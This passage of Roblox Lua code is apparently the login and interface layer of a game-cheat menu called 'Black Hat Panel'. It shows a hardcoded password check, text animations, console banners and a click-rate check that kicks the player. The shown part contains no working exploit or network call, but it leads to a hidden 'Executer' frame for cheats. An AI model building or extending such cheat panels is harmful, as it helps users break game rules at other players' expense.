	local Correct = script.parent.Correct
	local Notcorrect = script.parent.Notcorrect
	local Checking = script.parent.Parent.CheckingText
	local db = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.PassBox.Text == "BHPNewWinner" then
			Checking.Visible = true
			wait(4.8)
			script.parent.Parent.Parent.Executer.Visible = true
			print("Correct password!")
			Correct:Play()
			MainLogin:Destroy()
		else
			Checking.Visible = true
			wrong.Visible = true
			warn("Wrong password. Try again!")
			Notcorrect:Play()
			wait(3)
			wrong.Visible = false
		end
	end)
end
coroutine.wrap(FECYQS_fake_script)()
local function OGMIHL_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	local MainLogin = script.Parent.Parent
	
	script.Parent.MouseButton1Click:Connect(function()
		MainLogin:Destroy()
	end)
end
coroutine.wrap(OGMIHL_fake_script)()
local function YFDPAUA_fake_script() -- WrongText.AnimateText 
	local script = Instance.new('LocalScript', WrongText)

	local PlayerGui = game.Players.LocalPlayer.PlayerGui
	local TextLabel = PlayerGui:WaitForChild("BlackHatPanelV132").MainLogin.WrongText
	
	local function animatetext(Text)
		for i = 1, #Text, 1 do
			TextLabel.Text = string.sub (Text, 1, i)
			wait(0.03)
		end
	end
	
	while true do
		animatetext("Wrong password. Try again!")
		wait(3)
	end
end
coroutine.wrap(YFDPAUA_fake_script)()
local function RTSOLU_fake_script() -- Desc.AnimateText 
	local script = Instance.new('LocalScript', Desc)

	local PlayerGui = game.Players.LocalPlayer.PlayerGui
	local TextLabel = PlayerGui:WaitForChild("BlackHatPanelV132").MainLogin.Notification.Desc
	
	local function animatetext(Text)
		for i = 1, #Text, 1 do
			TextLabel.Text = string.sub (Text, 1, i)
			wait(0.03)
		end
	end
	
	while true do
		animatetext("Succesfully Executed Black Hat Panel Version 1.3.2")
		wait(2)
		animatetext("Thanks for executing!")
		wait(2)
		animatetext("Also you must confirm first.")
		wait(2)
		animatetext("Well idk why i just added that thing to confirm but idc.")
		wait(3.5)
		animatetext("Please enter the password.")
		wait(5)
		script.parent.Parent.Parent.Notification:Destroy()
		break
	end
end
coroutine.wrap(RTSOLU_fake_script)()
local function IZISLX_fake_script() -- CheckingText.LocalScript 
	local script = Instance.new('LocalScript', CheckingText)

	local me = script.parent.Parent.CheckingText
	
	local function Check()
		
		local seconds = 0.5
		
		me.Text = "Checking"
		wait(seconds)
		me.Text = "Checking."
		wait(seconds)
		me.Text = "Checking.."
		wait(seconds)
		me.Text = "Checking..."
		wait(seconds)
		me.Text = "Checking"
		wait(seconds)
		me.Text = "Checking."
		wait(seconds)
		me.Text = "Checking.."
		wait(seconds)
		me.Text = "Checking..."
		wait(seconds)
		me.Text = "Checking"
		wait(seconds)
		me.Text = "Checking"
		wait(seconds)
		me.Text = "Checking."
		wait(seconds)
		me.Text = "Checking.."
		wait(seconds)
		me.Text = "Checking..."
		wait(seconds)
		me.Text = "Checking"
		wait(seconds)
		me.Text = "Checking"
		wait(seconds)
		me.Text = "Checking."
		wait(seconds)
		me.Text = "Checking.."
		wait(seconds)
		me.Text = "Checking..."
		wait(seconds)
		me.Text = "Checking"
	end
	
	if me.Visible == true then
		Check()
		wait(4.8)
		me.Visible = false
	end
end
coroutine.wrap(IZISLX_fake_script)()
local function UGBDZAR_fake_script() -- MainLogin.LocalScript 
	local script = Instance.new('LocalScript', MainLogin)

	local ME = script.parent.Parent.MainLogin
	
	if ME.Visible == true then
		print("////////////////////////////////////////////////////////")
		print("/               Succesfully Executed Black Hat Panel")
		warn("/                       You aren't the beta tester")
		print("/")
		print("/")
		print("/")
		print("/Black Hat Panel Executed!!!")
		print("/")
		print("/")
		print("/Please login first.")
		print("/")
		print("/")
		print("/")
		print("/")
		print("/")
		print("/fact: Did you know that everyone can blink? BEST FACT lol/")
		print("/")
		warn("/WARNING!! some hacks aren't scripted by me so i don't get reported for this or something idk lol.")
		print("/Created by me")                                                                                  
		print("//////////////////// VERSION 1.3.2 /////////////////////")
	end
end
coroutine.wrap(UGBDZAR_fake_script)()
local function ZXNS_fake_script() -- BlackHatPanelV132.Instance 
	local script = Instance.new('LocalScript', BlackHatPanelV132)

	-- Gui to Lua
	-- Version: 3.2
	
	-- Instances:
	
	local ScreenGui = Instance.new("ScreenGui")
	local StarterPlayerScripts = game.StarterPlayer.StarterPlayerScripts
	
	--Properties:
	
	ScreenGui.Name = "Nothing"
	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
	-- Scripts:
	
	local function IEDXTRB_fake_script() -- ScreenGui.Counter 
		local script = Instance.new('LocalScript', StarterPlayerScripts)
		
		local LoginButton = script.Parent.Parent.Parent.StarterGui.BlackHatPanelV132.MainLogin.LoginButton
		local maxClicks = 25
		local clicks = 0
		
		local function Detected()
			
			local Error = script.Parent.Parent.Parent.StarterGui.BlackHatPanelV132.MainLogin.ErrorText
			
			local countdown = 10
			
			Error.Visible = true and LoginButton.Visible == false
			warn("Too much CPS!")
			wait(countdown)
			game.Players.LocalPlayer:Kick("Too much CPS! Reason: Because we don't have a hack script that contains autoclicker and it makes us useless whats wrong with you?")	
			
		end
		
		local mouseClick = game.Players.LocalPlayer:GetMouse()
		
		mouseClick.Button1Down:Connect(function()
			clicks += 1
			print("CPS Detected in Black Hat Panel")
			print(clicks)
			
			if clicks >= maxClicks then
				LoginButton.Visible = false and Detected()
			end
		end)
		
		while wait(1) do
			clicks = 0
		end
	end
	coroutine.wrap(IEDXTRB_fake_script)()
	
end
coroutine.wrap(ZXNS_fake_script)()
